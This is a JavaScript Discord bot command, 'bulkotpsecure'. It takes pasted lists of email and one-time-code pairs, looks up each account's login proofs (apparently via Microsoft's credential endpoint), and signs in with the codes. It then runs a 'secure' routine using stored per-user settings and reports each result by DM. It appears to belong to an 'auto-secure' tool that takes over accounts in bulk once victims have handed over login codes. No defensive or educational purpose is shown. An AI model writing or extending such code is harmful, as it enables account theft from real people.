const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const generateuid = require("../../utils/generateuid");
const sendStatus = require("./bulkStatusMessage");
const getCredentials = require("../../utils/info/getCredentials");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "bulkotpsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        await interaction.deferReply({ ephemeral: true });

        const lines = interaction.fields
            .getTextInputValue("accounts")
            .split("\n")
            .map(l => l.trim())
            .filter(Boolean)
            .slice(0, 7);

        let settings = await queryParams(
            "SELECT * FROM secureconfig WHERE user_id=?",
            [interaction.user.id]
        );
        settings = settings[0];

        for (const line of lines) {
            try {
                const [email, otp] = line.split(":");
                const profiles = await getCredentials(email, false);

                for (const sec of profiles.Credentials.OtcLoginEligibleProofs) {
                    const host = await login(
                        { email, id: sec.data, code: otp },
                        profiles
                    );

                    if (!host) continue;

                    const uid = await generateuid();
                    await sendStatus(interaction, uid);

                    const acc = await secure(host, settings, uid, null);
                    await interaction.user.send({
                        content: `✅ OTP Secure finished for **${email}**`
                    });
                    break;
                }
            } catch (e) {
                await interaction.user.send(
                    `❌ OTP Secure failed for: ${line}`
                );
            }
        }

        await interaction.editReply("✅ Bulk OTP process started. Check DMs.");
    }
};
